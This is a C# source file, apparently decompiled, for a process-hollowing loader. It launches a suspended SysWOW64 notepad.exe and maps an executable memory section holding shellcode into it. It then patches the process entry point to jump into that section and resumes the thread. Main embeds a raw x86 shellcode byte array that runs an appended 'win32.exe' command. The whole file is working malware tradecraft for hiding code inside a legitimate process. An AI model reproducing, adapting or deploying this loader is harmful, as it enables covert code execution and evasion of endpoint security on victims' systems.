using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Hollowing;

public sealed class Loader
{
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;

		public IntPtr hThread;

		public int dwProcessId;

		public int dwThreadId;
	}

	internal struct PROCESS_BASIC_INFORMATION
	{
		public IntPtr Reserved1;

		public IntPtr PebAddress;

		public IntPtr Reserved2;

		public IntPtr Reserved3;

		public IntPtr UniquePid;

		public IntPtr MoreReserved;
	}

	internal struct STARTUPINFO
	{
		private uint cb;

		private IntPtr lpReserved;

		private IntPtr lpDesktop;

		private IntPtr lpTitle;

		private uint dwX;

		private uint dwY;

		private uint dwXSize;

		private uint dwYSize;

		private uint dwXCountChars;

		private uint dwYCountChars;

		private uint dwFillAttributes;

		private uint dwFlags;

		private ushort wShowWindow;

		private ushort cbReserved;

		private IntPtr lpReserved2;

		private IntPtr hStdInput;

		private IntPtr hStdOutput;

		private IntPtr hStdErr;
	}

	public struct SYSTEM_INFO
	{
		public uint dwOem;

		public uint dwPageSize;

		public IntPtr lpMinAppAddress;

		public IntPtr lpMaxAppAddress;

		public IntPtr dwActiveProcMask;

		public uint dwNumProcs;

		public uint dwProcType;

		public uint dwAllocGranularity;

		public ushort wProcLevel;

		public ushort wProcRevision;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct LARGE_INTEGER
	{
		public uint LowPart;

		public int HighPart;
	}

	public const uint PageReadWriteExecute = 64u;

	public const uint PageReadWrite = 4u;

	public const uint PageExecuteRead = 32u;

	public const uint MemCommit = 4096u;

	public const uint SecCommit = 134217728u;

	public const uint GenericAll = 268435456u;

	public const uint CreateSuspended = 4u;

	public const uint DetachedProcess = 8u;

	public const uint CreateNoWindow = 134217728u;

	private const int AttributeSize = 24;

	private const ulong PatchSize = 16uL;

	public static byte[] target_ = Encoding.ASCII.GetBytes("win32.exe");

	public static string HollowedProcessX85 = "C:\\Windows\\SysWOW64\\notepad.exe";

	private IntPtr section_;

	private IntPtr localmap_;

	private IntPtr remotemap_;

	private IntPtr localsize_;

	private IntPtr remotesize_;

	private IntPtr pModBase_;

	private IntPtr pEntry_;

	private uint rvaEntryOffset_;

	private uint size_;

	private byte[] inner_;

	[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
	private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

	[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
	private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

	[DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
	private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

	[DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
	private static extern IntPtr GetCurrentProcess();

	[DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
	private static extern void CloseHandle(IntPtr handle);

	[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
	private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

	[DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

	[DllImport("kernel32.dll")]
	private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern uint ResumeThread(IntPtr hThread);

	[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
	private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);

	[DllImport("kernel32.dll")]
	private static extern uint GetLastError();

	public uint round_to_page(uint size)
	{
		SYSTEM_INFO lpSysInfo = default(SYSTEM_INFO);
		GetSystemInfo(ref lpSysInfo);
		return lpSysInfo.dwPageSize - size % lpSysInfo.dwPageSize + size;
	}

	private bool nt_success(long v)
	{
		return v >= 0L;
	}

	public IntPtr GetCurrent()
	{
		return GetCurrentProcess();
	}

	public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
	{
		IntPtr baseAddr = addr;
		IntPtr viewSize = (IntPtr)size_;
		long num = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0u, protect);
		if (!nt_success(num))
		{
			throw new SystemException("[x] Something went wrong! " + num);
		}
		return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
	}

	public bool CreateSection(uint size)
	{
		LARGE_INTEGER pMaxSize = default(LARGE_INTEGER);
		size_ = round_to_page(size);
		pMaxSize.LowPart = size_;
		long v = ZwCreateSection(ref section_, 268435456u, (IntPtr)0, ref pMaxSize, 64u, 134217728u, (IntPtr)0);
		return nt_success(v);
	}

	public void SetLocalSection(uint size)
	{
		KeyValuePair<IntPtr, IntPtr> keyValuePair = MapSection(GetCurrent(), 64u, IntPtr.Zero);
		if (keyValuePair.Key == (IntPtr)0)
		{
			throw new SystemException("[x] Failed to map view of section!");
		}
		localmap_ = keyValuePair.Key;
		localsize_ = keyValuePair.Value;
	}

	public unsafe void CopyShellcode(byte[] buf)
	{
		long num = size_;
		if (buf.Length > num)
		{
			throw new IndexOutOfRangeException("[x] Shellcode buffer is too long!");
		}
		byte* ptr = (byte*)(void*)localmap_;
		for (int i = 0; i < buf.Length; i++)
		{
			ptr[i] = buf[i];
		}
	}

	public PROCESS_INFORMATION StartProcess(string path)
	{
		STARTUPINFO lpStartinfo = default(STARTUPINFO);
		PROCESS_INFORMATION lpProcInformation = default(PROCESS_INFORMATION);
		if (!CreateProcess((IntPtr)0, path, (IntPtr)0, (IntPtr)0, bInheritHandles: false, 4u, (IntPtr)0, (IntPtr)0, ref lpStartinfo, out lpProcInformation))
		{
			throw new SystemException("[x] Failed to create process!");
		}
		return lpProcInformation;
	}

	public unsafe KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
	{
		int num = 0;
		IntPtr intPtr = Marshal.AllocHGlobal((IntPtr)16L);
		byte* ptr = (byte*)(void*)intPtr;
		byte[] array = null;
		if (IntPtr.Size == 4)
		{
			ptr[num] = 184;
			num++;
			int value = (int)dest;
			array = BitConverter.GetBytes(value);
		}
		else
		{
			ptr[num] = 72;
			num++;
			ptr[num] = 184;
			num++;
			long value2 = (long)dest;
			array = BitConverter.GetBytes(value2);
		}
		for (int i = 0; i < IntPtr.Size; i++)
		{
			ptr[num + i] = array[i];
		}
		num += IntPtr.Size;
		ptr[num] = byte.MaxValue;
		num++;
		ptr[num] = 224;
		num++;
		return new KeyValuePair<int, IntPtr>(num, intPtr);
	}

	private unsafe IntPtr GetEntryFromBuffer(byte[] buf)
	{
		IntPtr zero = IntPtr.Zero;
		fixed (byte* ptr = buf)
		{
			uint num = *(uint*)(ptr + 60);
			byte* ptr2 = ptr + (int)num;
			byte* ptr3 = ptr2 + 24;
			byte* ptr4 = ptr3 + 16;
			int num2 = (int)(rvaEntryOffset_ = *(uint*)ptr4);
			zero = ((IntPtr.Size != 4) ? ((IntPtr)(pModBase_.ToInt64() + num2)) : ((IntPtr)(pModBase_.ToInt32() + num2)));
		}
		pEntry_ = zero;
		return zero;
	}

	public IntPtr FindEntry(IntPtr hProc)
	{
		PROCESS_BASIC_INFORMATION procInformation = default(PROCESS_BASIC_INFORMATION);
		uint retlen = 0u;
		long v = ZwQueryInformationProcess(hProc, 0, ref procInformation, (uint)(IntPtr.Size * 6), ref retlen);
		if (!nt_success(v))
		{
			throw new SystemException("[x] Failed to get process information!");
		}
		IntPtr zero = IntPtr.Zero;
		byte[] array = new byte[IntPtr.Size];
		zero = ((IntPtr.Size != 4) ? ((IntPtr)((long)procInformation.PebAddress + 16L)) : ((IntPtr)((int)procInformation.PebAddress + 8)));
		IntPtr lpNumberOfBytesRead = IntPtr.Zero;
		if (!ReadProcessMemory(hProc, zero, array, array.Length, out lpNumberOfBytesRead) || lpNumberOfBytesRead == IntPtr.Zero)
		{
			throw new SystemException("[x] Failed to read process memory!");
		}
		if (!ReadProcessMemory(hProc, pModBase_ = ((IntPtr.Size != 4) ? ((IntPtr)BitConverter.ToInt64(array, 0)) : ((IntPtr)BitConverter.ToInt32(array, 0))), inner_, inner_.Length, out lpNumberOfBytesRead) || lpNumberOfBytesRead == IntPtr.Zero)
		{
			throw new SystemException("[x] Failed to read module start!");
		}
		return GetEntryFromBuffer(inner_);
	}

	public void MapAndStart(PROCESS_INFORMATION pInfo)
	{
		KeyValuePair<IntPtr, IntPtr> keyValuePair = MapSection(pInfo.hProcess, 64u, IntPtr.Zero);
		if (keyValuePair.Key == (IntPtr)0 || keyValuePair.Value == (IntPtr)0)
		{
			throw new SystemException("[x] Failed to map section into target process!");
		}
		remotemap_ = keyValuePair.Key;
		remotesize_ = keyValuePair.Value;
		KeyValuePair<int, IntPtr> keyValuePair2 = BuildEntryPatch(keyValuePair.Key);
		try
		{
			IntPtr nSize = (IntPtr)keyValuePair2.Key;
			IntPtr lpNumWritten = default(IntPtr);
			if (!WriteProcessMemory(pInfo.hProcess, pEntry_, keyValuePair2.Value, nSize, out lpNumWritten) || lpNumWritten == IntPtr.Zero)
			{
				throw new SystemException("[x] Failed to write patch to start location! " + GetLastError());
			}
		}
		finally
		{
			if (keyValuePair2.Value != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(keyValuePair2.Value);
			}
		}
		byte[] lpBuffer = new byte[4096];
		IntPtr lpNumberOfBytesRead = default(IntPtr);
		if (!ReadProcessMemory(pInfo.hProcess, pEntry_, lpBuffer, 1024, out lpNumberOfBytesRead))
		{
			throw new SystemException("Failed!");
		}
		uint num = ResumeThread(pInfo.hThread);
		if (num == uint.MaxValue)
		{
			throw new SystemException("[x] Failed to restart thread!");
		}
	}

	public IntPtr GetBuffer()
	{
		return localmap_;
	}

	~Loader()
	{
		if (localmap_ != (IntPtr)0)
		{
			ZwUnmapViewOfSection(section_, localmap_);
		}
	}

	public void Load(string targetProcess, byte[] shellcode)
	{
		PROCESS_INFORMATION pInfo = StartProcess(targetProcess);
		FindEntry(pInfo.hProcess);
		if (!CreateSection((uint)shellcode.Length))
		{
			throw new SystemException("[x] Failed to create new section!");
		}
		SetLocalSection((uint)shellcode.Length);
		CopyShellcode(shellcode);
		MapAndStart(pInfo);
		CloseHandle(pInfo.hThread);
		CloseHandle(pInfo.hProcess);
	}

	public Loader()
	{
		section_ = default(IntPtr);
		localmap_ = default(IntPtr);
		remotemap_ = default(IntPtr);
		localsize_ = default(IntPtr);
		remotesize_ = default(IntPtr);
		inner_ = new byte[4096];
	}

	private static void Main(string[] args)
	{
		byte[] array = new byte[184]
		{
			252, 232, 130, 0, 0, 0, 96, 137, 229, 49,
			192, 100, 139, 80, 48, 139, 82, 12, 139, 82,
			20, 139, 114, 40, 15, 183, 74, 38, 49, 255,
			172, 60, 97, 124, 2, 44, 32, 193, 207, 13,
			1, 199, 226, 242, 82, 87, 139, 82, 16, 139,
			74, 60, 139, 76, 17, 120, 227, 72, 1, 209,
			81, 139, 89, 32, 1, 211, 139, 73, 24, 227,
			58, 73, 139, 52, 139, 1, 214, 49, 255, 172,
			193, 207, 13, 1, 199, 56, 224, 117, 246, 3,
			125, 248, 59, 125, 36, 117, 228, 88, 139, 88,
			36, 1, 211, 102, 139, 12, 75, 139, 88, 28,
			1, 211, 139, 4, 139, 1, 208, 137, 68, 36,
			36, 91, 91, 97, 89, 90, 81, 255, 224, 95,
			95, 90, 139, 18, 235, 141, 93, 106, 1, 141,
			133, 178, 0, 0, 0, 80, 104, 49, 139, 111,
			135, 255, 213, 187, 240, 181, 162, 86, 104, 166,
			149, 189, 157, 255, 213, 60, 6, 124, 10, 128,
			251, 224, 117, 5, 187, 71, 19, 114, 111, 106,
			0, 83, 255, 213
		};
		byte[] array2 = new byte[array.Length + target_.Length + 1];
		Array.Copy(array, array2, array.Length);
		Array.Copy(target_, 0, array2, array.Length, target_.Length);
		array2[array.Length + target_.Length] = 0;
		Loader loader = new Loader();
		try
		{
			loader.Load(HollowedProcessX85, array2);
		}
		catch (Exception ex)
		{
			Console.WriteLine("[x] Something went wrong!" + ex.Message);
		}
	}
}
